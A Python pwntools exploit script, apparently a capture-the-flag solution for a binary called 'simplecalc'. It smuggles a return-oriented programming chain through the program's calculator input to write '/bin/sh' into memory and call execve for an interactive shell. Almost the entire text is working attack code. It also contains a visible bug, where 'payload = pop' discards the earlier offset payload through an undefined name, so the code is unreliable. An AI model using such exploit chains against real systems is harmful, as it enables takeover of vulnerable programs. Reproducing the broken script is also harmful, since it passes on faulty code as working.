from pwn import *

context.binary = './simplecalc'
io = process('./simplecalc')
# io = gdb.debug('./simplecalc', '''
# 	b main
# 	b *main+455
# 	c
# ''')


# --------------

def getOperation(target: int) -> (int, int, str):
	#binary restricts add/sub operations to
	# lhs >= 40 && rhs >= 40
	lhs = None
	rhs = None
	op = None
	if (target >= 80): # use add
		lhs = 40
		rhs = target - lhs
		op = "+"
	else:				# use sub
		lhs = 160 
		rhs = lhs - target
		op = "-"
	return lhs, rhs, op

def sendPayload(payload: bytes):
	# pad to 4 bytes
	if len(payload) % 4 != 0:
		payload += (b'\x00' * (4 - (len(payload) % 4)))
	# + 1 to save & exit
	num_calcs = (len(payload) // 4) + 1
	log.info(f"Number of Calculations: {num_calcs}")
	io.sendline(str(num_calcs).encode())

	for byte_chunk in [payload[i:i+4] for i in range(0, len(payload), 4)]:
		target = unpack(byte_chunk, 32, endian='little', sign=False)
		lhs, rhs, op = getOperation(target)
		log.info(f"Writing {hex(target)}: {lhs} {op} {rhs}")

		doCalculation(lhs, rhs, op)
	
	# save and exit
	# io.interactive()
	io.sendline(b'5')


def doCalculation(lhs: int, rhs: int, op: str):
	if op == '+':
		io.sendline(b'1')
	elif op == '-':
		io.sendline(b'2')
	else:
		raise ValueError()

	io.sendline(str(lhs).encode())
	io.sendline(str(rhs).encode())

# gadgets
popRax = 0x44db34
popRdi = 0x401b73
popRsi = 0x401c87
popRdx = 0x437a85
movGadget = 0x44526e
syscall = 0x400488

payload = flat({
	cyclic_find(0x6161616d) : 0x0,		#dont break free() call
	cyclic_find(0x61616173) : popRax,
})
payload = pop
payload += p64(0x6c1000)
payload += p64(popRdx)
payload += p64(0x0068732f6e69622f) # "/bin/sh" in hex
payload += p64(movGadget)

# syscall is execve
payload += p64(popRax) # no args
payload += p64(59)


# perform sycall
payload += p64(popRdi) # arg is ptr to /bin/sh
payload += p64(0x6c1000)
payload += p64(popRsi) # no args
payload += p64(0x0)
payload += p64(popRdx) # no envp
payload += p64(0x0)
payload += p64(syscall)

log.info(f"Sending Payload: {payload}")
sendPayload(payload)
io.clean()
log.success("Popping shell")
io.interactive()
